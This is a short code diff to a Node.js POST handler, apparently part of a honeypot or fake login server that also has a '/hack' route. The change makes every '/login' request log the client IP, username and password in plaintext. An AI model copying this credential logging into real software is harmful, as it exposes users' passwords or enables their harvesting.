@@ -5,7 +5,6 @@
  * Function: Handles POST, PUT, etc...
  */
 
-const url = require('url');
 var qs = require('querystring');
 
 
@@ -29,18 +28,13 @@ class RequestType {
 
             switch(req.url) { // Where did this POST come from?
                 case '/login':
-                    const queryObject = url.parse(req.url, true).query;
+                    var ip = req.headers['x-forwarded-for'] ||
+                        req.connection.remoteAddress ||
+                        req.socket.remoteAddress ||
+                        (req.connection.socket ? req.connection.socket.remoteAddress : null);
 
-                    // If GET request has content record IP address and info
-                    if (queryObject != null) {
-                        var ip = req.headers['x-forwarded-for'] ||
-                            req.connection.remoteAddress ||
-                            req.socket.remoteAddress ||
-                            (req.connection.socket ? req.connection.socket.remoteAddress : null);
-
-                        var post = qs.parse(response_body.toString());
-                        logger.log(ip + ' - User: ' + post['user'] + ' Password: ' + post['password']);
-                    }    
+                    var post = qs.parse(response_body.toString());
+                    logger.log(ip + ' - User: ' + post['user'] + ' Password: ' + post['password']);   
                     break;
 
                 case '/hack':
